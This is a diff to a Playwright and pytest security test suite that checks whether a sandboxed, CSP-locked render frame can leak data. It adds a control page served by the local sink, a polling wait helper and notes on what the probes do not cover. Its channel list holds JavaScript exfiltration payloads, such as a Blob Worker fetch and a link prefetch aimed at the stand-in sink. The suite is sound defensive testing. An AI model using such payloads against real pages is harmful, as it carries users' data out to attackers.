@@ -17,6 +17,18 @@ unreachable host are the same `TypeError: fetch failed`, and the result is
 byte-identical with a `default-src 'none'` meta present and absent. A red-probe
 there would be green against no policy at all.
 
+What this suite does NOT test, stated up front so a green is not read as more
+than it is. Playwright injects each payload with `frame.evaluate`, which runs in
+a CDP isolated world — code executes there even in a frame where a page script
+could not start at all. So these probes measure the NETWORK layer: given running
+code, can anything carry a byte out. They do not exercise the earlier leg, that
+`script-src 'none'` and a sandbox without `allow-scripts` stop the script from
+running in the first place. A frame that lost that leg entirely would still pass
+every probe here. Verified rather than assumed: an isolated-world `fetch` and
+`img` in a `srcdoc` frame under `connect-src 'none'; img-src 'none'` are blocked
+by CSP and reach nothing, so the network claim these probes make is sound — it
+is simply narrower than the whole invariant.
+
 Every probe has three parts, and the third is what makes it worth running:
 
 1. an ATTEMPT — real payload, real channel, executed in the frame;
@@ -103,7 +115,23 @@ class _Sink:
                 self.end_headers()
                 self.wfile.write(b"GIF89a")
 
-            do_GET = _record
+            def do_GET(self) -> None:  # noqa: N802
+                if self.path == "/__control__":
+                    # A real http origin on the same address space as the sink.
+                    # The control CANNOT run from about:blank: Chromium's
+                    # Private Network Access refuses a null, insecure origin
+                    # reaching loopback, so every channel reports dead and the
+                    # control fails for a reason that has nothing to do with
+                    # the payloads. Measured, not assumed.
+                    body = b"<!doctype html><meta charset=utf-8><title>control</title>"
+                    self.send_response(200)
+                    self.send_header("Content-Type", "text/html; charset=utf-8")
+                    self.send_header("Content-Length", str(len(body)))
+                    self.end_headers()
+                    self.wfile.write(body)
+                    return
+                self._record()
+
             do_POST = _record
 
             def log_message(self, *_args) -> None:  # keep pytest output clean
@@ -155,6 +183,28 @@ _CHANNELS: list[tuple[str, str]] = [
     ("worker", "try { new Worker(URL.createObjectURL(new Blob([\"fetch('\" + SINK + \"/worker-MARKER')\"], {type: 'text/javascript'}))) } catch (e) {}"),
     ("prefetch", "(() => { const l = document.createElement('link'); l.rel = 'prefetch'; l.href = SINK + '/prefetch-MARKER'; document.head.appendChild(l) })()"),
 ]
+
+
+# One budget for both probe families, so a channel is never given less time to
+# leak than it was given to prove it can.
+_SETTLE_MS = 2500
+
+
+def _await_hit(page, sink: "_Sink", marker: str) -> bool:
+    """Wait until the sink records `marker`, or the budget expires.
+
+    A flat sleep is the wrong instrument in both directions: too short and a
+    slow channel reads as "no leak" under CI load, too long and every clean
+    probe pays for it. Polling ends the moment a hit lands, and only spends the
+    full budget when there is nothing to see.
+    """
+    waited = 0
+    while waited < _SETTLE_MS:
+        if sink.saw(marker):
+            return True
+        page.wait_for_timeout(100)
+        waited += 100
+    return sink.saw(marker)
 
 
 def _attempt(context, payload: str) -> None:
@@ -249,7 +299,10 @@ def test_n1_the_render_frame_reaches_no_attacker_origin(channel: str, js: str):
                 )
                 payload = js.replace("SINK", repr(sink.url)).replace("MARKER", marker)
                 _attempt(frame, payload)
-                page.wait_for_timeout(1500)
+                # Spends the full budget here by design: this probe expects no
+                # hit, so it must wait as long as the control gives a channel
+                # to produce one.
+                _await_hit(page, sink, marker)
             finally:
                 browser.close()
 
@@ -286,13 +339,14 @@ def test_n2_the_same_channels_reach_the_sink_from_an_unpoliced_page():
                 page = browser.new_page()
                 for channel, js in _CHANNELS:
                     marker = "ctl-" + channel.replace(" ", "-").replace(".", "")
-                    # about:blank has no CSP and no sandbox; a channel that
-                    # cannot reach the sink from here is not a live channel.
-                    page.goto("about:blank")
+                    # Served BY the sink: a real http origin on the same
+                    # address space, so Private Network Access does not refuse
+                    # the hop. No CSP, no sandbox — a channel that cannot reach
+                    # the sink from here is not a live channel.
+                    page.goto(f"{sink.url}/__control__")
                     payload = js.replace("SINK", repr(sink.url)).replace("MARKER", marker)
                     _attempt(page, payload)
-                    page.wait_for_timeout(800)
-                    if not sink.saw(marker):
+                    if not _await_hit(page, sink, marker):
                         dead.append(channel)
             finally:
                 browser.close()
